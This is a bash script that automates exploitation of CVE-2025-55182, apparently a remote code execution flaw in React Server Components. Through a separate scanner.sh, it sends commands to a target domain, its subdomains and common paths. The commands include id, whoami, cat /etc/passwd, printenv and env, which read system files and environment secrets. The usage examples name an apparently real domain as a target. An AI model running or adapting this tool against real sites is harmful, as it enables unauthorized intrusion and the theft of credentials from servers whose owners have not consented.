#!/bin/bash

# CVE-2025-55182 Advanced Multi-Test Scanner
# Automatically tests multiple commands, subdomains, and paths
# Version: 2.0.0

VERSION="2.0.0"
DOMAIN=""
SCANNER_SCRIPT="./scanner.sh"
OUTPUT_DIR="scan_results_$(date +%Y%m%d_%H%M%S)"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

TOTAL_TESTS=0
SUCCESSFUL_TESTS=0
FAILED_TESTS=0

print_banner() {
    clear
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║   CVE-2025-55182 Advanced Multi-Test Scanner v${VERSION}        ║"
    echo "║   Automated Testing with Multiple Commands & Targets         ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

print_usage() {
    echo "Usage: $0 -d <domain> [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -d, --domain       Target domain (required)"
    echo "  -o, --output       Custom output directory (default: auto-generated)"
    echo "  -s, --scanner      Path to scanner.sh (default: ./scanner.sh)"
    echo "  -q, --quick        Quick scan (fewer tests)"
    echo "  -f, --full         Full scan (all tests - default)"
    echo "  -h, --help         Show this help"
    echo ""
    echo "Examples:"
    echo "  $0 -d infiniteathlete.ai"
    echo "  $0 -d example.com --quick"
    echo "  $0 -d example.com --full -o my_scan_results"
    echo ""
}

SCAN_MODE="full"
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -d|--domain)
                DOMAIN="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -s|--scanner)
                SCANNER_SCRIPT="$2"
                shift 2
                ;;
            -q|--quick)
                SCAN_MODE="quick"
                shift
                ;;
            -f|--full)
                SCAN_MODE="full"
                shift
                ;;
            -h|--help)
                print_usage
                exit 0
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}"
                print_usage
                exit 1
                ;;
        esac
    done

    if [ -z "$DOMAIN" ]; then
        echo -e "${RED}Error: Domain is required!${NC}"
        print_usage
        exit 1
    fi

    if [ ! -f "$SCANNER_SCRIPT" ]; then
        echo -e "${RED}Error: Scanner script not found at $SCANNER_SCRIPT${NC}"
        exit 1
    fi
}

init_output() {
    mkdir -p "$OUTPUT_DIR"
    echo -e "${GREEN}[+]${NC} Created output directory: ${CYAN}$OUTPUT_DIR${NC}"
    echo ""
}

run_test() {
    local target=$1
    local command=$2
    local test_name=$3
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    echo -e "${CYAN}[*]${NC} Testing: ${YELLOW}$test_name${NC}"
    echo "    Target:  $target"
    echo "    Command: $command"
    
    local output=$("$SCANNER_SCRIPT" -d "$target" -c "$command" 2>&1)
    local exit_code=$?
    
    if echo "$output" | grep -q "Command executed successfully"; then
        SUCCESSFUL_TESTS=$((SUCCESSFUL_TESTS + 1))
        echo -e "${GREEN}[✓] SUCCESS!${NC} Vulnerability confirmed!"
        echo ""
        echo -e "${GREEN}════════════════════════════════════════════════════${NC}"
        echo "$output"
        echo -e "${GREEN}════════════════════════════════════════════════════${NC}"
        echo ""
        
        {
            echo "========================================="
            echo "SUCCESSFUL TEST - $(date)"
            echo "Test: $test_name"
            echo "Target: $target"
            echo "Command: $command"
            echo "========================================="
            echo "$output"
            echo ""
        } >> "$OUTPUT_DIR/successful_tests.txt"
        
        return 0
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        
        if echo "$output" | grep -q "403"; then
            echo -e "${RED}[✗]${NC} Failed - WAF/Firewall blocked (403)"
        elif echo "$output" | grep -q "500"; then
            echo -e "${YELLOW}[!]${NC} Failed - Server error (500) - Promising!"
            {
                echo "========================================="
                echo "500 ERROR - $(date)"
                echo "Test: $test_name"
                echo "Target: $target"
                echo "Command: $command"
                echo "========================================="
                echo "$output"
                echo ""
            } >> "$OUTPUT_DIR/500_errors.txt"
        elif echo "$output" | grep -q "timeout"; then
            echo -e "${RED}[✗]${NC} Failed - Connection timeout"
        elif echo "$output" | grep -q "SSL"; then
            echo -e "${RED}[✗]${NC} Failed - SSL certificate issue"
        else
            echo -e "${RED}[✗]${NC} Failed - Not vulnerable"
        fi
        echo ""
        
        {
            echo "Test: $test_name | Target: $target | Command: $command | Status: FAILED"
        } >> "$OUTPUT_DIR/all_tests.log"
        
        return 1
    fi
}

get_commands_quick() {
    cat << 'EOF'
id
whoami
hostname
pwd
EOF
}

get_commands_full() {
    cat << 'EOF'
id
whoami
hostname
pwd
echo test
ls
uname -a
cat /etc/passwd
printenv
env
node -v
npm -v
node --version
cat package.json
id -u
id -g
EOF
}

get_subdomains() {
    cat << 'EOF'
www
app
api
dashboard
admin
platform
portal
auth
login
panel
manage
staging
dev
test
EOF
}

get_paths() {
    cat << 'EOF'
/api
/api/action
/_next
/app
/login
/dashboard
/admin
EOF
}

run_scan() {
    local base_domain=$1
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}  Starting ${SCAN_MODE} scan on: ${YELLOW}$base_domain${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    local commands
    if [ "$SCAN_MODE" == "quick" ]; then
        commands=$(get_commands_quick)
    else
        commands=$(get_commands_full)
    fi
    
    {
        echo "CVE-2025-55182 Scan Report"
        echo "=========================="
        echo "Target Domain: $base_domain"
        echo "Scan Mode: $SCAN_MODE"
        echo "Start Time: $(date)"
        echo "Scanner Version: $VERSION"
        echo ""
    } > "$OUTPUT_DIR/scan_report.txt"
    
    echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}  Phase 1: Testing Main Domain${NC}"
    echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    while IFS= read -r cmd; do
        [ -z "$cmd" ] && continue
        run_test "$base_domain" "$cmd" "Main domain - $cmd"
        sleep 1
    done <<< "$commands"
    
    if [ "$SCAN_MODE" == "full" ]; then
        echo ""
        echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${MAGENTA}  Phase 2: Testing Subdomains${NC}"
        echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
        echo ""
        
        while IFS= read -r subdomain; do
            [ -z "$subdomain" ] && continue
            local target="${subdomain}.${base_domain}"
            
            echo -e "${CYAN}[→]${NC} Testing subdomain: ${YELLOW}$target${NC}"
            
            for cmd in "id" "whoami" "hostname"; do
                run_test "$target" "$cmd" "Subdomain $subdomain - $cmd"
                sleep 1
            done
        done <<< "$(get_subdomains)"
    fi
    
    if [ "$SCAN_MODE" == "full" ]; then
        echo ""
        echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${MAGENTA}  Phase 3: Testing Different Paths${NC}"
        echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
        echo ""
        
        while IFS= read -r path; do
            [ -z "$path" ] && continue
            local target="${base_domain}${path}"
            
            echo -e "${CYAN}[→]${NC} Testing path: ${YELLOW}$target${NC}"
            
            for cmd in "id" "whoami" "hostname"; do
                run_test "$target" "$cmd" "Path $path - $cmd"
                sleep 1
            done
        done <<< "$(get_paths)"
    fi
}

generate_report() {
    echo ""
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}  Scan Complete - Summary Report"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}Target Domain:${NC}     $DOMAIN"
    echo -e "${CYAN}Scan Mode:${NC}         $SCAN_MODE"
    echo -e "${CYAN}Total Tests:${NC}       $TOTAL_TESTS"
    echo -e "${GREEN}Successful:${NC}        $SUCCESSFUL_TESTS"
    echo -e "${RED}Failed:${NC}            $FAILED_TESTS"
    echo -e "${CYAN}Output Directory:${NC}  $OUTPUT_DIR"
    echo ""
    
    {
        echo ""
        echo "Scan Summary"
        echo "============"
        echo "Total Tests: $TOTAL_TESTS"
        echo "Successful: $SUCCESSFUL_TESTS"
        echo "Failed: $FAILED_TESTS"
        echo "End Time: $(date)"
        echo ""
    } >> "$OUTPUT_DIR/scan_report.txt"
    
    echo -e "${YELLOW}Results saved to:${NC}"
    if [ -f "$OUTPUT_DIR/successful_tests.txt" ]; then
        echo -e "  ${GREEN}✓${NC} Successful tests: ${OUTPUT_DIR}/successful_tests.txt"
    fi
    if [ -f "$OUTPUT_DIR/500_errors.txt" ]; then
        echo -e "  ${YELLOW}!${NC} 500 errors (promising): ${OUTPUT_DIR}/500_errors.txt"
    fi
    echo -e "  ${CYAN}•${NC} Full report: ${OUTPUT_DIR}/scan_report.txt"
    echo -e "  ${CYAN}•${NC} All tests log: ${OUTPUT_DIR}/all_tests.log"
    echo ""
    
    if [ $SUCCESSFUL_TESTS -gt 0 ]; then
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  🎉 VULNERABILITY FOUND! 🎉${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${GREEN}Check successful_tests.txt for full details!${NC}"
        echo ""
    elif grep -q "500" "$OUTPUT_DIR/all_tests.log" 2>/dev/null; then
        echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}║  ⚠️  500 Errors Found - Potentially Vulnerable! ⚠️${NC}"
        echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${YELLOW}Check 500_errors.txt for targets to investigate further!${NC}"
        echo -e "${YELLOW}Try different commands or manual testing on these targets.${NC}"
        echo ""
    else
        echo -e "${RED}No vulnerabilities found.${NC}"
        echo -e "Target may be patched or not using React Server Components."
        echo ""
    fi
}

main() {
    print_banner
    parse_args "$@"
    
    if [ ! -x "$SCANNER_SCRIPT" ]; then
        chmod +x "$SCANNER_SCRIPT" 2>/dev/null || {
            echo -e "${RED}Error: Cannot execute $SCANNER_SCRIPT${NC}"
            exit 1
        }
    fi
    
    init_output
    
    echo -e "${BLUE}┌─ Scan Configuration ─────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│${NC} Target:      ${CYAN}${DOMAIN}${NC}"
    echo -e "${BLUE}│${NC} Scan Mode:   ${YELLOW}${SCAN_MODE}${NC}"
    echo -e "${BLUE}│${NC} Scanner:     ${SCANNER_SCRIPT}"
    echo -e "${BLUE}│${NC} Output:      ${OUTPUT_DIR}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    
    read -p "Press Enter to start scan (Ctrl+C to cancel)..."
    echo ""
    
    START_TIME=$(date +%s)
    
    run_scan "$DOMAIN"
    
    END_TIME=$(date +%s)
    DURATION=$((END_TIME - START_TIME))
    
    generate_report
    
    echo -e "${CYAN}Scan Duration:${NC}     ${DURATION} seconds"
    echo ""
    echo -e "${GREEN}Done! Happy Bug Hunting! 🎯${NC}"
}

main "$@"
